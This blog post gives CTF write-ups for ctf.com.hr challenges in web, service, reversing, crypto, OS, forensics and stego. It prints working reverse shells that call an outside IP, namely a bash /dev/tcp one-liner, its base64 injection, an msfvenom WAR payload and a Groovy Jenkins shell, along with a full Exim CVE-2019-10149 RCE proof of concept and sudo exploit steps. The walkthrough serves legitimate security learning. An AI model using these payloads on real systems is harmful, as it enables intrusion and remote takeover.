---
title: "CTF.COM.HR"
date: 2023-11-10T16:29:19+01:00
draft: false
---
## Tools
(that are not mentioned in the write ups)

- Reverse shell generator: [revshells.com](revshells.com)
- Remote port forwarding: [portmap.io](portmap.io)
	- Allow to get a reverse shell without having to open a port at home.
	- It generates an OpenVPN config that will forward an outside port of the VPN to a port inside (to my computer).

## WebApp

### Execute_1

I solved this challenge by solving **Execute_2** (see below).

The flag is located at /FLAG.txt.

### Execute_2

The website is greeting us with a `403 Forbidden`.
We can see: `Apache/2.4.41 (Ubuntu) Server at localhost Port 8000`.
It could be useful later.

I started by running [feroxbuster](https://github.com/epi052/feroxbuster) to find any resources that I can access. I used the wordlist `Discovery/Web-Content/raft-medium-directories.txt` from [seclists](https://github.com/danielmiessler/SecLists).

I found `/app1/`.

On this page, we have a textbox to input a command and a submit button. If we input any word like "test" or "ls", we get the output of a `php -v` command from `/exec.php`. But the input doesn't seems to change anything.

At this time, I wasn't sure if we had to inject PHP commands to be executed by the PHP CLI or if we had to inject bash commands.

I tried injecting bash commands with `;` and `&&` without success.
I tried injecting PHP commands thinking they would be appended to  `php -v` like `-r phpinfo();` to execute `php -v -r phpinfo();` without success.

If we input "<" or ">", we get nothing. Only an empty `<pre></pre>`.

I thought it could be a parsing error but the only other special character that gave me no result was `pipe |`.

So it's not a parsing error, it's just redirecting the output.

I tried with `| ls` and bingo! We can inject bash commands!

The flag is in `FLAg.txt` in the current directory (`/var/www/html/app1/`).

Then I found the flag of **Execute_1** in `/var/www/html/FLAG.txt`.

I also got a reverse shell using `bash` and `/dev/tcp` since netcat is not installed:
```bash
/bin/bash -i >& /dev/tcp/193.161.193.99/24193 0>&1
```

I encoded it in base 64 to avoid the filter deleting `;` and `&`. Here's my full payload:
```bash
| echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5My4xNjEuMTkzLjk5LzI0MTkzIDA+JjE=' | base64 -d | /bin/bash
```

### Execute_3

I'm trying to escalate privileges but kernel exploitation is not the good way (up to date), `sudo` is not installed, I didn't find any SUID or GUID exploitable binary and I didn't find a writable cron job.

We can `su` to `HNUser` using the password from **SSH jump_1**.

### Armageddon 1

I started by running [feroxbuster](https://github.com/epi052/feroxbuster) to find any resources that I can access. I used the wordlist `Discovery/Web-Content/raft-medium-directories.txt` from [seclists](https://github.com/danielmiessler/SecLists).

I found `drupal` which seemed interesting. I didn't know what it is so I started by doing some research.

I found the **CVE-2018-7600** which is also called **Drupalgeddon**. It's really similar to the name of the challenge.

So I ran this exploit [Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2).

And I got a shell.

The flag is in the current directory: `/opt/lampp/htdocs/drupal/FLAG0.txt`

### Armageddon 2

Using the shell from **Armageddon 1**, I ran `find / -iname 'flag*'` and I found the flag in `/home/robert/FLAG1.txt`.

### Armageddon 3

Using the shell from **Armageddon 1**, I ran `find / -iname 'flag*'` and I found the flag in `/home/robert/.ssh/FLAG2.txt`.

### Armageddon 4

I supposed the last flag was in `/root` so I tried to escalate privileges. I didn't find any CVE in these versions of MariaDB and httpd. But I found a CVE for this version of Ubuntu (`Ubuntu 18.04.1`).

So I tried to use the **CVE-2021-3156 (Sudo Baron Samedit)**.
Here is an awesome video explaining the vulnerability: [How SUDO on Linux was HACKED! // CVE-2021-3156](https://www.youtube.com/watch?v=TLa2VqcGGEQ)

I started by compiling and executing the exploit [exploit_timestamp_race](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_timestamp_race.c) to edit `/etc/passwd` but it completely corrupted it. I was unable to `su` and the shell became unusable. So I waited for the end of the hour for the container to reset.

Then I tried with [exploit_nss.py](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py) but I got an error because the command `ip` from the package `iproute2` wasn't installed. 

To fix it, I edited the script to replace:
```python
proc = subprocess.Popen(['ip', 'addr'], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True)
```
by
```python
proc = subprocess.Popen(['ifconfig'], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True)
```

I ran it and got a shell as root!

As I expected, the flag is in `/root/FLAG3.txt`.

### Tom & Jerry

We have something that seems to be a default tomcat installation. I know it's possible to upload and execute payloads through the WebApp Manager. I tried different common `user:pass` combos like `admin:admin`, `tomcat:s3cret` and `tomcat:tomcat`. The last one is working.

I've also started `nikto` before finding the default combo, it also found it but after me:

```bash
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          137.116.255.41
+ Target Hostname:    play.h4ck3r.one
+ Target Port:        9004
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=play.h4ck3r.one
                   Altnames: play.h4ck3r.one
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /C=US/O=Let's Encrypt/CN=R3
+ Start Time:         2022-12-09 22:44:16 (GMT1)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
+ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0xW/21630 0x1465480610000 
+ OSVDB-39272: favicon.ico file identifies this server as: Apache Tomcat
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ Cookie JSESSIONID created without the secure flag
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat.
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /docs/: Tomcat Documentation found
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
+ 7625 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2022-12-09 23:18:06 (GMT1) (2030 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

I generated a payload with `msfvenom`:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=193.161.193.99 LPORT=24193 -f war > reverseshell.war
```

I opened the file with `vim` to see the content:
```bash
vim reverseshell.war 

" zip.vim version v32
" Browsing zipfile /home/kilian/reverseshell.war
" Select a file and press ENTER

WEB-INF/
WEB-INF/web.xml
ojpbwdjo.jsp
```

I uploaded it using the form on the management page.
I opened `play.h4ck3r.one:9004/reverseshell/ojpbwdjo.jsp` and I got my shell and we are root!

I used `find / -iname 'flag*'` to find the flag in `/usr/local/tomcat/conf/FLAG.txt`.

### Jenny

I started by running `nikto`:
```bash
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          137.116.255.41
+ Target Hostname:    play.h4ck3r.one
+ Target Port:        9003
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=play.h4ck3r.one
                   Altnames: play.h4ck3r.one
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /C=US/O=Let's Encrypt/CN=R3
+ Start Time:         2022-12-10 00:05:07 (GMT1)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
+ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0xW/21630 0x1465480610000 
+ OSVDB-39272: favicon.ico file identifies this server as: Apache Tomcat
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ Cookie JSESSIONID created without the secure flag
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ /manager/html: Default Tomcat Manager / Host Manager interface found
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /docs/: Tomcat Documentation found
+ Uncommon header 'x-hudson-cli-port' found, with contents: 40801
+ Uncommon header 'x-instance-identity' found, with contents: MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2caz2kFq5xG+0yUT4cxGJW7iYA4LaG0p9w4ULNnrnlVIAmOdNAefd0VELXCfl3dyPtP2LUTN1piT66vhsfzYyaD85d4vCyiyl27N5yxZY2wOqR4jBUsElHarO0iRaSHZYdg6nPPAJvRutHPcQkW/JvSvAZjgLxud3ke9ZC9ArKpWpZPdgPcRXlq1p0a7G9Ss/RbP8Nd3EsFk4julNfWwMwNM5gJ/zwKgBTxZclT0WXY/MevHGJi2At9SCCPKiSCfwxzjzp1+9KxPGyGvysJu08kehSfwT4TWDdCHQo8C8zTb3iuJDBA0sPq/dz5ETPa67vK8SnLPGtES2yJ3DTG66wIDAQAB
+ Uncommon header 'x-jenkins-cli-port' found, with contents: 40801
+ Uncommon header 'x-hudson' found, with contents: 1.395
+ Uncommon header 'x-jenkins-cli2-port' found, with contents: 40801
+ Uncommon header 'x-jenkins-session' found, with contents: a5ed1c9e
+ Uncommon header 'x-jenkins' found, with contents: 1.637
+ Uncommon header 'x-ssh-endpoint' found, with contents: localhost:41811
+ Uncommon header 'x-hudson-theme' found, with contents: default
+ /jenkins/manage: Jenkins/Hudson Management console accessible without authentication.
+ /jenkins/script: Jenkins/Hudson Groovy Script console accessible without authentication. This allows to execution of shell commands.
+ /manager/status: Default Tomcat Server Status interface found
+ 7802 requests: 0 error(s) and 24 item(s) reported on remote host
+ End Time:           2022-12-10 00:39:24 (GMT1) (2057 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

It found the page `/jenkins/script` allowing execution of shell commands without authentification.

This page executes 'Groovy' scripts. I used this reverse shell in Groovy:

```groovy
String host="193.161.193.99";int port=24193;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

And I got a shell!

After running `find / -iname 'flag*'`, I found the flag in `/usr/local/share/man/FLAG.txt`.

## Service

### Eskimo 1

After running nmap, I’ve found that the service running behind the port is Exim 4.89.

I searched on Google for CVE and I found the **CVE-2019-10149.** I used it for RCE.

I used the POC of MNEMO-CERT as a base:

```python
#!/usr/bin/python3
import sys, socket, argparse

class exim_rce(object):
        def smtp_connect(self, hex_cmd, exim):
                message = "Received: 1\nReceived: 2\nReceived: 3\nReceived: 4\nReceived: 5\nReceived: 6\nReceived: 7\nReceived: 8\nReceived: 9\nReceived: 10\nReceived: 11\nReceived: 12\nReceived: 13\nReceived: 14\nReceived: 15\nReceived: 16\nReceived: 17\nReceived: 18\nReceived: 19\nReceived: 20\nReceived: 21\nReceived: 22\nReceived: 23\nReceived: 24\nReceived: 25\nReceived: 26\nReceived: 27\nReceived: 28\nReceived: 29\nReceived: 30\nReceived: 31"
                rcpt = r"<${run{\x2Fbin\x2Fbash\t-c\t\x22" + hex_cmd + r"\x22}}@localhost>"
                server = exim

                try:
                        print("[+] Trying to connect to the server")
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect(server)
                        s.recv(1024)
                        print("[+] Sending commands to the Exim Server")
                        s.send("HELO evil.localhost\r\n".encode())
                        s.recv(1024)
                        s.send("MAIL FROM: <>\r\n".encode())
                        s.recv(1024)
                        s.send("RCPT TO:".encode() + rcpt.encode() + "\r\n".encode())
                        s.recv(1024)
                        s.send("DATA\r\n".encode())
                        s.recv(1024)
                        s.send(message.encode() + "\r\n.\r\n".encode())
                        s.recv(1024)
                        s.send("QUIT\r\n".encode())
                except Exception as e:
                        print("[--] The server is not responding[--]")

        def cmd(self,command,server):
                cmd = []
                for letter in command:
                        c=hex(ord(letter))
                        cmd.append(c)
                        hex_cmd = ''.join(cmd).replace("0x","\\x")
                self.smtp_connect(hex_cmd,server)

if __name__ == '__main__':
        parser = argparse.ArgumentParser(description = "[MNEMO-CERT] - PoC CVE-2019-10149 Exim - Command Execution as root")
        parser.add_argument('-s','--server', help="Exim server IP address and port <IP:Port> - Default: localhost:25")

        requiredArg = parser.add_argument_group("Required argument")
        requiredArg.add_argument('-c','--cmd', help='Type the command you want to execute through Exim')
        args, unknown = parser.parse_known_args()
        if args.server is not None:
                srv = args.server.split(":")
                server = (srv[0],int(srv[1]))
        else:
                server = ("localhost", 25)

        if args.cmd:
                mnemo = exim_rce()
                cmd = args.cmd
                mnemo.cmd(cmd,server)

        else:
                parser.print_help()
                sys.exit(1)
```

I used netcat to get a reverse shell:

```bash
python3 exploit.py -s play.h4ck3r.one:9002 -c "sh -i >& /dev/tcp/193.161.193.99/61477 0>&1"
```

I got a root shell and I found the flag in FLAG.txt in logs.

### Eskimo 2

Same as the 1st one. The file .bash_history hasn’t been cleared so I found all setups commands and the location of the second FLAG.txt in /root.

## Reversing

### Reverse me ….

I opened the .exe in IDA and I saw with the imports that it was a compiled Python script.

I used [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) to unpack the .exe file and [uncompyle6](https://github.com/rocky/python-uncompyle6) to decompile .pyc files.

I saw in IDA that the script is called “test.py” so I decompiled “test.pyc”:

```bash
# uncompyle6 version 3.8.0
# Python bytecode 3.8.0 (3413)
# Decompiled from: Python 3.10.1 (tags/v3.10.1:2cd268a, Dec  6 2021, 19:10:37) [MSC v.1929 64 bit (AMD64)]
# Embedded file name: test.py
s1 = '\x16-24\x0c;\x1a\r,\n\x19\x03\x01B\x0f4\x12\r3!6996<*3+"'
s2 = ''
while s2 != 'Pa' + chr(115) + 'sw' + chr(111) + 'rd' + chr(95) + 'Unbr' + chr(101) + chr(97) + 'kable' + chr(95) * 9:
    s2 = input('Please insert password: ')

print(''.join((chr(ord(a) ^ ord(b)) for a, b in zip(s1, s2))))
# okay decompiling test.pyc
```

I removed the while loop in the script and got the flag with the last print.

## Crypto

### DecryptMe

I used [dcode.fr](http://dcode.fr) to identify the cipher type. Then I used dcode to brute force it and find the flag.

### BBQ

It’s obviously a book cipher so I looked for the book PDF in Google. In the file, “cX” is the charcacter number, “rX” the row number and “pX” the page number. After getting all characters, I got the flag.

### Cracking enterprise WPA 

There’s no handshake as said in the challenge but there’s a PMKID in the capture.

I used hxcpcapngtool from [hcxtools](https://github.com/ZerBea/hcxtools) to convert the capture to an hashcat format.

I ran hashcat on this file with rockyou as dictionnary to find the password (and the flag).

### RSA might be funny

Here e is 3, and with only c and e known, the only possible “vulnerability” is that $(m^e)^d < n$.

By simply computing $\sqrt[3]{c}$, we can find m.

I converted the result to text to find the flag.

## OS

### SSH jump_1

I tried simple 7 characters long passwords based on the challenge text. I found that `Pass123` is working.

The flag is in `/home/HNUser/FLAG.txt`.

### SSH jump_2

For this one I had to escalate privileges. I ran `sudo -l` and bingo! I can run `vim` as root!

```bash
$ sudo -l
[sudo] password for HNUser: 
Matching Defaults entries for HNUser on ssh_vim:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User HNUser may run the following commands on ssh_vim:
    (ALL : ALL) /usr/bin/vim
```

I ran `sudo vim /root` and found the flag in `/root/FLAG.txt`.

## Forensic

### Secret

%%[Windows 10 x64 psscan error: ^: 'int' and 'NoneType' · Issue #436 · volatilityfoundation/volatility (github.com)](https://github.com/volatilityfoundation/volatility/issues/436)%%

I tried to open the dump with volatility3, but the "ScanFile" module isn't working. I tried with volatility2 but same issue.

```console
Cannot find nt!ObGetObjectType
```

It was obvious that the file was corrupted but at this time, I thought it was on purpose. I extracted the ntoskrnl module with volatility and I reversed it in IDA. The function ObGetObjectType was here but it's content wasn't matching with the "correct" function.

I did a signature scan inside volatility with Yara to find this function and nt!ObHeaderCookie to fix my ScanFiles error.

I found the function but nt!ObHeaderCookie wasn't here.

Then I tried to find the ZIP file manually by looking for magic bits in the dump but none of my findings were valid ZIP files.

I unlocked the hint, thinking it would help me but it was just "Use Volatility".

Some days later, I went to [ctfnorway.no](https://www.ctfnorway.no/) by following the link on the main page just by curiosity. I found that the same challenge (Forensic:**Secret**) was there but with a different dump.

I used volatility with this dump, ran ScanFiles:
```bash
vol -f Downloads/memdump01.mem windows.filescan | grep .zip
0xb2859b374a30.0\Windows\System32\nb-NO\zipfldr.dll.mui	216
0xb2859b3899f0	\Windows\System32\zipfldr.dll	216
0xb2859b5bba50	\temp\secret.zip	216
```

This time it's working!

```bash
vol -f Downloads/memdump01.mem -o Downloads/ windows.dumpfile --virtaddr 0xb2859b5bba50
Volatility 3 Framework 2.0.1
Progress:  100.00		PDB scanning finished                        
Cache	FileObject	FileName	Result

DataSectionObject	0xb2859b5bba50	secret.zip	file.0xb2859b5bba50.0xb2859b5c5a80.DataSectionObject.secret.zip.dat

```

```bash
mv Downloads/file.0xb2859b5bba50.0xb2859b5c5a80.DataSectionObject.secret.zip.dat Downloads/secret.zip
```

```bash
unzip Downloads/secret.zip
Archive:  Downloads/secret.zip
[Downloads/secret.zip] flag.docx password: 
```

So there is a file `flag.docx` inside but it's password protected.

I used `zip2john` to get the hash. We can see that it's a `pkzip` encryption so I used `hashcat` with `rockyou.txt` and the rule `dive.rule`:
```bash
hashcat -m 17200 secretzip.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/dive.rule
```

And the password is `c0rr0si0n`.
We can unzip the file and find the password in flag.docx.

The flag is working on both [ctfnorway.no](http://www.ctfnorway.no) and [ctf.com.hr](https://ctf.com.hr).

I tested if it's possible to get the ZIP file from the dump on [ctf.com.hr](https://ctf.com.hr) by knowing the base virtual address of the file, without success.

## OSINT

### Cathedral

I just used Google Image reverse search to find the cathedral name and the city.

## Steg

### Unknown

I opened the file with an Hex editor and it looked like a corrupted file. Firsts “magic bytes” were missing. I looked in the list of files signatures ([Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)) to find one finishing with `“39 61”`. The only one was .gif so I fixed the file with `“47 49 46 38 39 61”`. I opened the file with a image viewer to find the flag.

## Encoding

### !Encryption
